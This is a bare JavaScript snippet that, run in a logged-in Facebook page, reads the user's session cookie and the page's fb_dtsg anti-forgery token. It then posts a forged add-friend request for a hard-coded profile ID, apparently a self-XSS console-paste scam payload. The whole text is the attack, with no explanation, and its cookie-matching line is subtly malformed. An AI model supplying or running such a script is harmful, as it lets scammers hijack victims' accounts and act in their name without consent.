 var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/add_friend/action.php?__pc=EXP1%3ADEFAULT";
var XParams = "&to_friend=100000820007690&action=add_friend&how_found=profile_button&ref_param=pb&link_data[gt][profile_owner]=100000820007690&link_data[gt][ref]=timeline%3Atimeline&outgoing_id=js_u&logging_location&no_flyout_on_click=true&ego_log_data&__user="+document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1])+"&__a=1&__dyn=&__req=&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value+"&ttstamp=&__rev=&confirmed=1";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
